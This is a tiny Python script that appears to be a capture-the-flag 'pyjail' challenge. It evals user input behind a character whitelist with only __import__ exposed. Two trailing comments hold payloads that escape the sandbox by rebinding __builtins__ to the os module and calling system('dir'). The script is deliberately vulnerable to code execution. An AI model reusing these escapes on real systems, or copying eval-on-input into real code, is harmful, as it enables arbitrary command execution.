
cod = input("sned cod: ")

if any(x not in "q(jw=_alsynxodtg)feum'zk:hivbcpr" for x in cod):
    print("bad cod")
else:
    try:
        print(eval(cod, {"__builtins__": {"__import__": __import__}}))
    except Exception as e:
        print("oop", e)


#(__builtins__:=__import__('os'))and((lambda:system)()('dir'))\
#(__builtins__:=__import__('os'))and(system('dir'))